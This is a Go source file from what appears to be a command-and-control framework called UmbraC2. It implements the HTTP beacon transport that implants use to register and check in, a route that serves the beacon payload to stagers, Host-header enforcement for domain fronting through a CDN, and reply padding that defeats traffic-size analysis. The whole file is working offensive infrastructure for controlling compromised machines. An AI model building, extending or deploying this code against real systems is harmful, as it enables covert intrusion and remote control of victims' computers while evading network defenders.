package link

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/session"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// httpSession is the server-side state of one HTTP beacon.
//
// HTTP is stateless, so the implant echoes the session id it received in
// HELLO_ACK as a URL path component. That value is a 128-bit capability: it
// selects the key set, and it cannot be used to read or forge traffic because
// every frame is still AEAD-protected and nonce-ordered.
type httpSession struct {
	mu      sync.Mutex
	link    *AgentLink
	agentID string
	suite   byte
	last    time.Time
}

// httpPath is the single source of truth for the beacon route. Both handlers
// derive from it: resolving it separately used to make the session route
// disagree with the mux whenever http_path was left empty in the config.
func (s *Server) httpPath() string {
	path := strings.TrimSuffix(s.Cfg.Server.HTTPPath, "/")
	if path == "" {
		return "/api/v1/beacon"
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	return path
}

func (s *Server) httpHandler() http.Handler {
	mux := http.NewServeMux()
	path := s.httpPath()
	mux.HandleFunc(path, s.handleBeaconHandshake)
	mux.HandleFunc(path+"/", s.handleBeaconFrame)
	// The file store is served as well: the stager that pulls the beacon
	// from the store of the server fetches it from here.
	mux.HandleFunc("/api/v1/artifact/", s.handleArtifact)
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		_, _ = io.WriteString(w, "ok\n")
	})
	return mux
}

// handleArtifact serves one file of the server-side store.
//
// The route is what the stager of the "store" mode downloads from: the
// operator drops the beacon into the store once and hands the stager the
// name of the artifact, so no third party host has to serve the payload.
func (s *Server) handleArtifact(w http.ResponseWriter, r *http.Request) {
	if s.Artifacts == nil {
		http.Error(w, "no artifact store", http.StatusNotFound)
		return
	}
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	name := strings.TrimPrefix(r.URL.Path, "/api/v1/artifact/")
	if name == "" || strings.Contains(name, "/") {
		http.Error(w, "bad artifact name", http.StatusBadRequest)
		return
	}
	data, entry, err := s.Artifacts.Read(name)
	if err != nil {
		http.Error(w, "artifact not found", http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	// The digest travels with the file, so a stager can prove what it got
	// without a second request.
	w.Header().Set("X-Umbra-SHA256", entry.SHA256)
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	_, _ = w.Write(data)
}

// handleBeaconHandshake handles the bootstrap POST: HELLO in, HELLO_ACK out.
//
// A request that asks for a WebSocket upgrade is served by the WebSocket
// transport instead: the same protocol, but every frame travels in a binary
// WebSocket frame.
func (s *Server) handleBeaconHandshake(w http.ResponseWriter, r *http.Request) {
	if isWebSocketUpgrade(r) {
		s.handleBeaconWebSocket(w, r)
		return
	}
	if !s.checkHostHeader(w, r) {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	addr := clientIP(r)
	if !s.guard.Allow(addr) {
		http.Error(w, "too many failures", http.StatusTooManyRequests)
		return
	}
	// A handshake body is exactly one frame; nothing else is meaningful here.
	body, err := readBeaconBody(r, int64(wire.MaxFrame))
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	h, err := wire.ParsePrelude(body)
	if err != nil {
		http.Error(w, "bad frame", http.StatusBadRequest)
		return
	}
	if h.Flags&wire.FlagBootstrap == 0 {
		http.Error(w, "handshake required", http.StatusUnauthorized)
		return
	}

	stream, out := NewHTTPStream(body)
	sess, info, err := Handshake(stream, s.Cfg, s.Keys, s.Log.With("peer", addr, "transport", "http"), addr)
	if err != nil {
		s.guard.Fail(addr)
		s.Log.Warn("http handshake failed", "peer", addr, "err", err)
		http.Error(w, "handshake failed", http.StatusUnauthorized)
		return
	}
	if info.Role != crypt.RoleAgent {
		http.Error(w, "wrong key role", http.StatusForbidden)
		return
	}
	s.guard.Succeed(addr)

	sleep, jitter := s.Cfg.Server.Beacon.Sleep, s.Cfg.Server.Beacon.Jitter
	meta := AgentMeta(info, "http", addr, sleep, jitter)
	rec, _, err := s.Hub.RegisterAgent(meta, "http", addr, info.Suite, info.SessionID)
	if err != nil {
		http.Error(w, "capacity", http.StatusServiceUnavailable)
		return
	}

	link := &AgentLink{Hub: s.Hub, Session: sess, AgentID: rec.ID, Transport: "http", Log: s.Log}
	// The transport key is the session id both sides already share from
	// HELLO_ACK, so nothing transport-specific leaks into the protocol.
	sid := hex.EncodeToString(info.SessionID)
	s.httpMu.Lock()
	s.httpSessions[sid] = &httpSession{link: link, agentID: rec.ID, suite: info.Suite, last: time.Now()}
	s.httpMu.Unlock()

	// The HELLO_ACK is sealed with the bootstrap session, so it cannot be
	// padded with the session of the link; it is a fixed size anyway.
	s.writeFrames(w, [][]byte{out.Bytes()})
	s.Log.Info("http agent registered", "agent", rec.ID, "peer", addr, "sid", sid)
}

// handleBeaconFrame handles an authenticated POST for an existing session.
// maxFramesPerRequest bounds how many frames one HTTP body may carry. A
// beacon normally sends one CHECKIN or a handful of RESULT frames per cycle.
const maxFramesPerRequest = 16

func (s *Server) handleBeaconFrame(w http.ResponseWriter, r *http.Request) {
	if !s.checkHostHeader(w, r) {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	sid := trimSessionID(r.URL.Path, s.httpPath())
	if len(sid) != 32 {
		http.Error(w, "bad session", http.StatusBadRequest)
		return
	}
	// Several frames may share one body: a beacon reports the results of a
	// whole batch and its BYE in a single POST.
	body, err := readBeaconBody(r, int64(wire.MaxFrame*maxFramesPerRequest))
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	frames, err := wire.SplitFrames(body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	if len(frames) == 0 {
		http.Error(w, "empty body", http.StatusBadRequest)
		return
	}
	if len(frames) > maxFramesPerRequest {
		http.Error(w, "too many frames", http.StatusRequestEntityTooLarge)
		return
	}

	s.httpMu.Lock()
	hs, ok := s.httpSessions[sid]
	s.httpMu.Unlock()
	if !ok {
		http.Error(w, "session expired", http.StatusGone)
		return
	}

	// One lock per request keeps the frames in the order the agent produced
	// them. Concurrent requests for the same session are serialised here, so
	// the seal/apply-rekey/read ordering still holds for HTTP.
	hs.mu.Lock()
	hs.last = time.Now()
	var out [][]byte
	var handleErr error
	closed := false
	for _, f := range frames {
		replies, err := hs.link.HandleFrame(f)
		if err != nil {
			handleErr = err
			break
		}
		out = append(out, replies...)
		if hs.link.Closed() {
			closed = true
			break
		}
	}
	// The padding is sealed with the session of the link, so it has to
	// happen under the same lock: the nonce counter must stay in order.
	if handleErr == nil {
		agent := hs.link
		padded, err := s.padFrames(agent.Session, out)
		if err != nil {
			s.Log.Warn("http padding failed", "err", err)
		} else {
			out = padded
		}
	}
	hs.mu.Unlock()

	if handleErr != nil {
		s.Log.Warn("http beacon frame rejected", "agent", hs.agentID, "err", handleErr)
		s.dropHTTPSession(sid)
		http.Error(w, "bad frame", http.StatusBadRequest)
		return
	}
	s.writeFrames(w, out)
	if closed {
		s.dropHTTPSession(sid)
	}
}

// checkHostHeader enforces the Host header the beacon is expected to send.
//
// With domain fronting the beacon names a fronting domain in the Host
// header while it talks to a CDN.  The origin then only accepts requests
// that carry exactly that name, so a request that reached the server
// directly is refused instead of being answered.
func (s *Server) checkHostHeader(w http.ResponseWriter, r *http.Request) bool {
	want := s.Cfg.Server.HTTPHostHeader
	if want == "" {
		return true
	}
	if r.Host != want {
		s.Log.Warn("http request with an unexpected host header",
			"peer", clientIP(r), "host", r.Host, "expected", want)
		http.Error(w, "unknown host", http.StatusMisdirectedRequest)
		return false
	}
	return true
}

// writeFrames sends the reply frames as one body with an explicit
// Content-Length. Without it Go falls back to chunked framing for bodies over a
// couple of KiB, and a chunked body can only be delimited by closing the
// connection — which defeats HTTP keep-alive on the beacon side.
func (s *Server) writeFrames(w http.ResponseWriter, frames [][]byte) {
	total := 0
	for _, f := range frames {
		total += len(f)
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.Itoa(total))
	w.WriteHeader(http.StatusOK)
	for _, f := range frames {
		if _, err := w.Write(f); err != nil {
			return
		}
	}
}

// padFrames appends a padding frame that rounds the body up to a bucket.
//
// When http_pad is set, the length of a reply no longer tells how much work
// it carried.  The padding is an ordinary sealed PADDING frame with a random
// body, so the receiver ignores it like any other padding.
func (s *Server) padFrames(sess *session.Session, frames [][]byte) ([][]byte, error) {
	pad := s.Cfg.Server.HTTPPad
	if pad <= 0 || len(frames) == 0 {
		return frames, nil
	}
	total := 0
	for _, f := range frames {
		total += len(f)
	}
	frame, ok, err := paddingFrame(sess, total, pad)
	if err != nil || !ok {
		return frames, err
	}
	return append(frames, frame), nil
}

// paddingFrame seals a PADDING frame that rounds a body of `total` bytes up
// to a multiple of `pad`.
//
// The size of the frame depends on the length prefix of its body, so the
// length is solved for instead of guessed: the body is a binary value, and
// its encoding is one tag byte, a uvarint length and the bytes themselves.
func paddingFrame(sess *session.Session, total, pad int) ([]byte, bool, error) {
	if pad <= 0 || total <= 0 {
		return nil, false, nil
	}
	// The fixed part of a frame: prelude, nonce, the upk tag of the body and
	// the authentication tag.
	const overhead = wire.HeaderLen + wire.TagLen + 1
	target := ((total + overhead + pad - 1) / pad) * pad
	for prefix := 1; prefix <= 3; prefix++ {
		length := target - total - overhead - prefix
		if length < 0 {
			continue
		}
		if uvarintLen(uint64(length)) != prefix {
			continue
		}
		body := make([]byte, length)
		if _, err := rand.Read(body); err != nil {
			return nil, false, err
		}
		frame, err := sess.Encrypt(wire.MsgPadding, body)
		if err != nil {
			return nil, false, err
		}
		if total+len(frame) == target {
			return frame, true, nil
		}
	}
	return nil, false, nil
}

// uvarintLen is the number of bytes an uvarint of n occupies.
func uvarintLen(n uint64) int {
	size := 1
	for n >= 0x80 {
		n >>= 7
		size++
	}
	return size
}

// dropHTTPSession forgets a session and marks the agent offline, so a link
// that failed or ended does not stay "live" forever.
func (s *Server) dropHTTPSession(sid string) {
	s.httpMu.Lock()
	hs, ok := s.httpSessions[sid]
	delete(s.httpSessions, sid)
	s.httpMu.Unlock()
	if ok {
		// Scoped to the session: a re-handshake may already own the agent id.
		s.Hub.UnregisterSession(hs.agentID, sid)
	}
}

// readBeaconBody reads a request body of at most limit bytes. One byte past the
// limit is read so an oversized body is detected rather than silently cut.
func readBeaconBody(r *http.Request, limit int64) ([]byte, error) {
	limit++
	body, err := io.ReadAll(io.LimitReader(r.Body, limit))
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}
	if len(body) == 0 {
		return nil, fmt.Errorf("empty body")
	}
	if int64(len(body)) >= limit {
		return nil, fmt.Errorf("body too large")
	}
	return body, nil
}

// sweepHTTPSessions drops sessions that have not polled within the timeout.
func (s *Server) sweepHTTPSessions(timeout time.Duration) {
	now := time.Now()
	s.httpMu.Lock()
	defer s.httpMu.Unlock()
	for sid, hs := range s.httpSessions {
		hs.mu.Lock()
		idle := now.Sub(hs.last) > timeout
		hs.mu.Unlock()
		if idle {
			delete(s.httpSessions, sid)
			s.Hub.UnregisterSession(hs.agentID, sid)
			s.Log.Info("http session expired", "agent", hs.agentID, "sid", sid)
		}
	}
}

func (s *Server) startHTTP(ctx context.Context) error {
	addr := s.Cfg.Server.HTTPListen
	if addr == "" {
		return nil
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("http listen %s: %w", addr, err)
	}
	srv := &http.Server{
		Handler:           s.httpHandler(),
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
		IdleTimeout:       90 * time.Second,
		MaxHeaderBytes:    16 << 10,
	}
	s.httpSrv = srv
	// The listener is one of the server's listeners: the address it was
	// given may be a port zero, and the operator (and the tests) need
	// the address the host really listens on.
	s.mu.Lock()
	s.listeners = append(s.listeners, ln)
	s.mu.Unlock()
	s.Log.Info("http transport listening", "addr", ln.Addr().String(), "path", s.httpPath(),
		"tls", s.Cfg.Server.HTTPTLSCert != "")

	go func() {
		var err error
		if s.Cfg.Server.HTTPTLSCert != "" && s.Cfg.Server.HTTPTLSKey != "" {
			err = srv.ServeTLS(ln, s.Cfg.Server.HTTPTLSCert, s.Cfg.Server.HTTPTLSKey)
		} else {
			err = srv.Serve(ln)
		}
		if err != nil && err != http.ErrServerClosed {
			s.Log.Error("http transport stopped", "err", err)
		}
	}()

	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				s.sweepHTTPSessions(s.Cfg.IdleTimeout())
			}
		}
	}()
	return nil
}

// trimSessionID extracts the session token from a frame route such as
// /api/v1/beacon/<32 hex>. It is a separate function so the route shapes can be
// tested without standing up a listener.
func trimSessionID(path, prefix string) string {
	return strings.TrimPrefix(path, prefix+"/")
}

// clientIP is the address used for rate limiting and for the agent record.
//
// X-Forwarded-For is honoured only when the request arrives from a loopback
// peer, i.e. the reverse proxy in deploy/nginx-http-transport.conf. Without that
// restriction any client could rotate the header to escape the failure guard,
// and without honouring it at all every proxied beacon would share 127.0.0.1.
func clientIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		host = r.RemoteAddr
	}
	ip := net.ParseIP(host)
	if ip == nil || !ip.IsLoopback() {
		return host
	}
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded == "" {
		return host
	}
	first := strings.TrimSpace(strings.Split(forwarded, ",")[0])
	if net.ParseIP(first) == nil {
		return host
	}
	return first
}
